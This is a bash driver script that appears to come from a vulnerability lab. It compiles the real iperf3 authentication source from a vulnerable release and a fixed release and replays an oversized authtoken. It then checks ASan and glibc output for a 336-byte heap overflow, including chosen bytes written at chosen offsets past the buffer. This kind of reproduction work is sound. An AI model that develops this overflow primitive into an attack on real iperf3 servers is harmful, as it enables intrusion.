#!/usr/bin/env bash
# Replay driver: bash lab/frontier/iperf2shell/run.sh <outdir>
# Compiles the REAL pinned esnet/iperf iperf_auth.c at tags 3.21 (vulnerable)
# and 3.22 (fixed) and calls decrypt_rsa_message() with an attacker-length
# decoded authtoken. No reimplementation of the vulnerable function.
set -u

here=$(cd "$(dirname "$0")" && pwd)
out=${1:-out}
mkdir -p "$out"
out=$(cd "$out" && pwd)
fail=0
pass() { printf 'PASS %s\n' "$1"; }
bad()  { printf 'FAIL %s\n' "$1"; fail=1; }
need() { if grep -qF -- "$2" "$1"; then pass "$3"; else bad "$3"; fi; }

# --- pinned source bytes (fetched from the tags recorded in PROVENANCE.md) ---
cat >"$out/pinned.sha256" <<'EOF'
2e92982324e1bb7110de4f6b9be2253ffeac33031c1f914ad4fe9d5d013a98ce  iperf_auth.c.3.21
4d0112f6c0bbbdbd2f7ccc1d2ec8641569eb6c0c7fb092bab597dffdaf4916c1  iperf_auth.c.3.22
24c5aec662ff305fa28409f480d36b7eb74b8f76b3d6b51a349c8c861cefc2d6  iperf_auth.h
EOF
if (cd "$here/src" && sha256sum -c "$out/pinned.sha256" >"$out/pinned.check" 2>&1); then
	pass PINNED_SOURCE_HASHES
else
	bad PINNED_SOURCE_HASHES
	cat "$out/pinned.check"
fi

# --- compile real pinned source, three modes ---
CFLAGS='-std=gnu11 -O0 -g -Wall -Wextra -Wno-sign-compare -I'"$here"' -I'"$here/src"
gcc $CFLAGS -o "$out/vuln" "$here/driver.c" -x c "$here/src/iperf_auth.c.3.21" -lcrypto || exit 91
gcc $CFLAGS -fsanitize=address -o "$out/asan" "$here/driver.c" -x c "$here/src/iperf_auth.c.3.21" -lcrypto || exit 92
gcc $CFLAGS -o "$out/fixed" "$here/driver.c" -x c "$here/src/iperf_auth.c.3.22" -lcrypto || exit 93
pass COMPILE

OVER=80

# --- rung 1/2: plain build. The OOB run corrupts the next heap chunk's
# metadata; glibc detects it at the function's OPENSSL_free() and aborts. ---
"$out/vuln" "$OVER" vuln >"$out/vuln.out" 2>&1
vrc=$?
if [ "$vrc" -ne 0 ]; then pass VULN_ABORT_NONZERO_RC; else bad VULN_ABORT_NONZERO_RC; fi
need "$out/vuln.out" 'Encrypted text of size 336 truncated to 256; likely invalid input.' RUNG1_WARN_ONLY_GUARD
need "$out/vuln.out" 'free(): invalid size' RUNG2_HEAP_METADATA_CORRUPTION

# --- rung 3: ASan-confirmed heap corruption in the REAL upstream function ---
ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 "$out/asan" "$OVER" asan >"$out/asan.out" 2>&1
arc=$?
if [ "$arc" -ne 0 ]; then pass ASAN_NONZERO_RC; else bad ASAN_NONZERO_RC; fi
need "$out/asan.out" 'heap-buffer-overflow' ASAN_HEAP_OVERFLOW
need "$out/asan.out" 'WRITE of size 336' ASAN_WRITE_SIZE
need "$out/asan.out" '0 bytes after 256-byte region' ASAN_EXACT_BOUNDARY
need "$out/asan.out" 'BIO_read' ASAN_CONSUMER_BIO_READ
need "$out/asan.out" 'decrypt_rsa_message' ASAN_UPSTREAM_FRAME
need "$out/asan.out" 'iperf_auth.c.3.21:324' ASAN_UPSTREAM_CALL_SITE

# --- rung 4 (instrumented): chosen bytes supplied at chosen offsets in the
# write buffer. ASan proves that exact 336-byte write crosses the boundary;
# there is no live stock iperf3 process and no useful-pointer control. ---
need "$out/asan.out" 'chosen_marker=49504552' RUNG4_CHOSEN_MARKER
need "$out/asan.out" 'chosen_fn=0x1122334455667788' RUNG4_CHOSEN_VALUE

# --- fixed control: 3.22 rejects before BIO_read ---
"$out/fixed" "$OVER" fixed >"$out/fixed.out" 2>&1
frc=$?
if [ "$frc" -eq 0 ]; then pass FIXED_RC0; else bad FIXED_RC0; fi
need "$out/fixed.out" 'exceeds RSA modulus 256; rejecting' FIXED_REJECT
need "$out/fixed.out" 'adjacent_readback plaintext_null=1' FIXED_ADJACENT_CLEAN

# --- deterministic trace (excludes ASan PID/address/path text) ---
{
	grep -E '^(label=|first_oob=|chosen_marker=)' "$out/asan.out" || true
	echo "ASAN_CLASS=heap-buffer-overflow"
	grep -E '^(label=|adjacent_readback=)' "$out/fixed.out" || true
} >"$out/trace.txt"
sha256sum "$out/trace.txt" | cut -d' ' -f1 >"$out/trace.sha256"
printf 'sha256=%s\n' "$(cat "$out/trace.sha256")"

if [ "$fail" -eq 0 ]; then
	echo 'ALL CHECKS PASS rc 0'
	exit 0
fi
echo 'SOME CHECKS FAILED rc 1'
exit 1
